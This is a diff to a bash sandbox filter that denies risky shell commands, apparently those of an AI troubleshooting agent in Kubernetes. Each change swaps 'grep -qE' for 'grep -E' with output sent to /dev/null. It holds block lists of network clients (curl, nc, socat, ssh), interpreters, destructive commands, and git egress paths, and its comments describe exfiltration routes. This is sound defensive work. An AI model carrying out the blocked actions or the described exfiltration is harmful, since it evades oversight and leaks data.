@@ -27,31 +27,31 @@ if [[ "$FIX_MODE" == "1" ]]; then
   # allowlist because make targets call kubectl in sub-processes via this sandbox.
 
   # make: only fix-* targets allowed; all other make invocations are blocked
-  if echo "$CMD" | grep -qE '\bmake\b'; then
-    if ! echo "$CMD" | grep -qE '\bmake\b.*(fix-[a-z]|file-bug)'; then
+  if echo "$CMD" | grep -E '\bmake\b' >/dev/null; then
+    if ! echo "$CMD" | grep -E '\bmake\b.*(fix-[a-z]|file-bug)' >/dev/null; then
       _deny "$CMD"
     fi
   fi
 
   # kubectl: allow rollout restart and delete pod only
-  if echo "$CMD" | grep -qE '\bkubectl\b'; then
-    if echo "$CMD" | grep -qE '\bkubectl\b.*\bdelete\b' && ! echo "$CMD" | grep -qE '\bkubectl\b.*delete\s+pod'; then
+  if echo "$CMD" | grep -E '\bkubectl\b' >/dev/null; then
+    if echo "$CMD" | grep -E '\bkubectl\b.*\bdelete\b' >/dev/null && ! echo "$CMD" | grep -E '\bkubectl\b.*delete\s+pod' >/dev/null; then
       _deny "$CMD"
     fi
-    if echo "$CMD" | grep -qE '\bkubectl\b.*(apply|create|edit|patch|replace|scale|cordon|drain|taint|label|annotate|expose|run\b|cp\b|exec\b|port-forward)'; then
+    if echo "$CMD" | grep -E '\bkubectl\b.*(apply|create|edit|patch|replace|scale|cordon|drain|taint|label|annotate|expose|run\b|cp\b|exec\b|port-forward)' >/dev/null; then
       _deny "$CMD"
     fi
   fi
 
   # argocd: allow app sync only
-  if echo "$CMD" | grep -qE '\bargocd\b'; then
-    if ! echo "$CMD" | grep -qE '\bargocd\b.*app\s+sync'; then
+  if echo "$CMD" | grep -E '\bargocd\b' >/dev/null; then
+    if ! echo "$CMD" | grep -E '\bargocd\b.*app\s+sync' >/dev/null; then
       _deny "$CMD"
     fi
   fi
 
   # helm: still fully blocked in fix mode (too broad)
-  if echo "$CMD" | grep -qE '\bhelm\b.*(install|uninstall|upgrade|rollback|delete|push|repo add|repo remove)'; then
+  if echo "$CMD" | grep -E '\bhelm\b.*(install|uninstall|upgrade|rollback|delete|push|repo add|repo remove)' >/dev/null; then
     _deny "$CMD"
   fi
 
@@ -59,22 +59,22 @@ else
   # ── Read-only mode (default) ─────────────────────────────────────────────────
 
   # kubectl write operations
-  if echo "$CMD" | grep -qE '\bkubectl\b.*(delete|apply|create|edit|patch|replace|rollout restart|scale|cordon|drain|taint|label|annotate|expose|run\b|cp\b|exec\b|port-forward|auth can-i --list)'; then
+  if echo "$CMD" | grep -E '\bkubectl\b.*(delete|apply|create|edit|patch|replace|rollout restart|scale|cordon|drain|taint|label|annotate|expose|run\b|cp\b|exec\b|port-forward|auth can-i --list)' >/dev/null; then
     _deny "$CMD"
   fi
 
   # argocd write operations
-  if echo "$CMD" | grep -qE '\bargocd\b.*(app (sync|delete|create|update|set|patch)|repo (add|rm)|cluster (add|rm)|proj (create|delete))'; then
+  if echo "$CMD" | grep -E '\bargocd\b.*(app (sync|delete|create|update|set|patch)|repo (add|rm)|cluster (add|rm)|proj (create|delete))' >/dev/null; then
     _deny "$CMD"
   fi
 
   # helm write operations
-  if echo "$CMD" | grep -qE '\bhelm\b.*(install|uninstall|upgrade|rollback|delete|push|repo add|repo remove)'; then
+  if echo "$CMD" | grep -E '\bhelm\b.*(install|uninstall|upgrade|rollback|delete|push|repo add|repo remove)' >/dev/null; then
     _deny "$CMD"
   fi
 
   # make: no read-only make target is needed for diagnosis; recipes run arbitrary shell.
-  if echo "$CMD" | grep -qE '\bmake\b'; then
+  if echo "$CMD" | grep -E '\bmake\b' >/dev/null; then
     _deny "$CMD"
   fi
 
@@ -83,66 +83,66 @@ fi
 # ── Always blocked (both modes) ───────────────────────────────────────────────
 
 # Destructive filesystem / process commands
-if echo "$CMD" | grep -qE '\b(rm|rmdir|dd|mkfs|shred|truncate|mv|chmod|chown|kill|killall|pkill)\b'; then
+if echo "$CMD" | grep -E '\b(rm|rmdir|dd|mkfs|shred|truncate|mv|chmod|chown|kill|killall|pkill)\b' >/dev/null; then
   _deny "$CMD"
 fi
 
 # General-purpose interpreters — bypass every denylist above, so block outright.
-if echo "$CMD" | grep -qE '\b(python[0-9.]*|perl|ruby|node|deno|bun|osascript|php|lua|tclsh|Rscript|gdb|lldb)\b'; then
+if echo "$CMD" | grep -E '\b(python[0-9.]*|perl|ruby|node|deno|bun|osascript|php|lua|tclsh|Rscript|gdb|lldb)\b' >/dev/null; then
   _deny "$CMD"
 fi
 
 # Editors / pagers with a shell-escape (:!cmd, !cmd) — bypass the denylist above.
-if echo "$CMD" | grep -qE '\b(vi|vim|view|ex|nano|emacs|pico|ed|less|more|man)\b'; then
+if echo "$CMD" | grep -E '\b(vi|vim|view|ex|nano|emacs|pico|ed|less|more|man)\b' >/dev/null; then
   _deny "$CMD"
 fi
 
 # find primitives that execute or mutate; the plain read forms stay allowed.
-if echo "$CMD" | grep -qE '\bfind\b.*-(exec(dir)?|delete|fprintf?|fls)\b'; then
+if echo "$CMD" | grep -E '\bfind\b.*-(exec(dir)?|delete|fprintf?|fls)\b' >/dev/null; then
   _deny "$CMD"
 fi
 
 # archive tools that can spawn a command per entry.
-if echo "$CMD" | grep -qE '\btar\b.*(--to-command|--checkpoint-action)|\bcpio\b'; then
+if echo "$CMD" | grep -E '\btar\b.*(--to-command|--checkpoint-action)|\bcpio\b' >/dev/null; then
   _deny "$CMD"
 fi
 
 # BSD awk (macOS /usr/bin/awk) can spawn a shell via system()/pipe; block the exec forms
 # while leaving stream use (awk on stdin) allowed.
-if echo "$CMD" | grep -qE '\bawk\b.*(system\s*\(|\|\s*"|"\s*\|)'; then
+if echo "$CMD" | grep -E '\bawk\b.*(system\s*\(|\|\s*"|"\s*\|)' >/dev/null; then
   _deny "$CMD"
 fi
 
 # Nested shell invocation and command-prefix maskers that hide the real command.
-if echo "$CMD" | grep -qE '\b(bash|sh|zsh|ksh|dash)\b\s+-c\b|\b(env|xargs|nice|nohup|timeout|sudo|command|builtin|exec|eval|watch|setsid)\b'; then
+if echo "$CMD" | grep -E '\b(bash|sh|zsh|ksh|dash)\b\s+-c\b|\b(env|xargs|nice|nohup|timeout|sudo|command|builtin|exec|eval|watch|setsid)\b' >/dev/null; then
   _deny "$CMD"
 fi
 
 # Output redirection / process substitution — can write or overwrite arbitrary paths
 # that the per-arg scope loop never sees (the target lives inside the -c string).
-if echo "$CMD" | grep -qE '(>>?|<\()'; then
+if echo "$CMD" | grep -E '(>>?|<\()' >/dev/null; then
   _deny "$CMD"
 fi
 
 # Outbound network clients — the sandbox does not need general egress to troubleshoot
 # (kubectl talks to the API server directly). Block them outright so a readable-file
 # exfil (curl "https://x/?d=$(...)") has nowhere to send the data.
-if echo "$CMD" | grep -qE '\b(curl|wget|nc|ncat|netcat|telnet|socat|ftp|scp|sftp|rsync|ssh)\b'; then
+if echo "$CMD" | grep -E '\b(curl|wget|nc|ncat|netcat|telnet|socat|ftp|scp|sftp|rsync|ssh)\b' >/dev/null; then
   _deny "$CMD"
 fi
 
 # Destructive git operations
-if echo "$CMD" | grep -qE '\bgit\b.*(reset\s+--hard|clean\s+-f|push\s+--force|push\s+-f|branch\s+-[Dd]|rebase|cherry-pick|stash\s+drop|reflog\s+delete)'; then
+if echo "$CMD" | grep -E '\bgit\b.*(reset\s+--hard|clean\s+-f|push\s+--force|push\s+-f|branch\s+-[Dd]|rebase|cherry-pick|stash\s+drop|reflog\s+delete)' >/dev/null; then
   _deny "$CMD"
 fi
 
 # git subcommands that reach the network are another egress path — a reader could exfil
 # readable files by pushing/cloning to an attacker remote, bypassing the client block above.
 # Local read-only inspection (log/status/diff/show/rev-parse/blame/…) stays allowed.
-if echo "$CMD" | grep -qE '\bgit\b.*\b(clone|fetch|pull|push|remote|ls-remote|submodule|send-pack|fetch-pack|upload-pack|request-pull|daemon)\b'; then
+if echo "$CMD" | grep -E '\bgit\b.*\b(clone|fetch|pull|push|remote|ls-remote|submodule|send-pack|fetch-pack|upload-pack|request-pull|daemon)\b' >/dev/null; then
   _deny "$CMD"
 fi
-if echo "$CMD" | grep -qE '\bgit\b.*--remote\b'; then
+if echo "$CMD" | grep -E '\bgit\b.*--remote\b' >/dev/null; then
   _deny "$CMD"
 fi
 
